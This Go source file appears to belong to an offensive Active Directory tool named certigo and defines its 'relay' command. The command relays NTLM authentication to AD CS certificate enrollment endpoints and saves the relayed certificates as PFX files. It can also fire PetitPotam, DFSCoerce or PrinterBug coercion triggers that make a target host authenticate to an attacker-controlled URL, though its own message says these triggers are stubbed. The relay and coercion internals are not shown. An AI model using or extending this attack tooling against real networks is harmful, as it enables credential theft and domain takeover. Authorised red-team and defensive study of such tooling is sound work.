package main

import (
	"fmt"

	"github.com/spf13/cobra"

	"github.com/ajm4n/certigo/internal/coerce"
	"github.com/ajm4n/certigo/internal/relay"
)

type relayFlags struct {
	listen      string
	target      string
	template    string
	tlsCert     string
	tlsKey      string
	outDir      string
	trigger     string
	targetHost  string
	attackerURL string
	username    string
	password    string
}

func newRelayCmd() *cobra.Command {
	f := &relayFlags{}
	cmd := &cobra.Command{
		Use:   "relay",
		Short: "Relay NTLM authentication to AD CS HTTP/RPC enrollment endpoints",
		RunE: func(cmd *cobra.Command, args []string) error {
			return runRelay(f)
		},
	}
	fl := cmd.Flags()
	fl.StringVar(&f.listen, "listen", ":80", "listen address (e.g. :80, :443)")
	fl.StringVar(&f.target, "target", "", "AD CS base URL (e.g. https://ca.ctg.local/certsrv/)")
	fl.StringVar(&f.template, "template", "User", "template to request")
	fl.StringVar(&f.tlsCert, "tls-cert", "", "TLS cert for HTTPS listener")
	fl.StringVar(&f.tlsKey, "tls-key", "", "TLS key for HTTPS listener")
	fl.StringVar(&f.outDir, "out-dir", "./relayed-pfx", "where to write relayed PFXes")
	fl.StringVar(&f.trigger, "trigger", "", "optional auth coercion: petitpotam|dfscoerce|printerbug")
	fl.StringVar(&f.targetHost, "target-host", "", "coercion target host")
	fl.StringVar(&f.attackerURL, "attacker-url", "", "URL the coerced host will auth to (e.g. http://attacker/)")
	fl.StringVarP(&f.username, "username", "u", "", "credentials for coercion trigger")
	fl.StringVarP(&f.password, "password", "p", "", "credentials for coercion trigger")
	return cmd
}

func runRelay(f *relayFlags) error {
	if f.target == "" {
		return fmt.Errorf("relay: --target required")
	}

	// Fire coercion (best-effort) before blocking on the listener.
	if f.trigger != "" {
		if f.targetHost == "" || f.attackerURL == "" {
			return fmt.Errorf("relay: --trigger requires --target-host and --attacker-url")
		}
		var err error
		switch f.trigger {
		case "petitpotam":
			err = coerce.TriggerPetitPotam(f.targetHost, f.attackerURL, f.username, f.password)
		case "dfscoerce":
			err = coerce.TriggerDFSCoerce(f.targetHost, f.attackerURL, f.username, f.password)
		case "printerbug":
			err = coerce.TriggerPrinterBug(f.targetHost, f.attackerURL, f.username, f.password)
		default:
			return fmt.Errorf("relay: unknown trigger %q", f.trigger)
		}
		fmt.Printf("coercion attempt (%s): %v (RPC triggers are stubbed pending go-msrpc bindings)\n", f.trigger, err)
	}

	return relay.Run(relay.Options{
		Listen:    f.listen,
		TargetURL: f.target,
		Template:  f.template,
		TLSCert:   f.tlsCert,
		TLSKey:    f.tlsKey,
		OutDir:    f.outDir,
	})
}
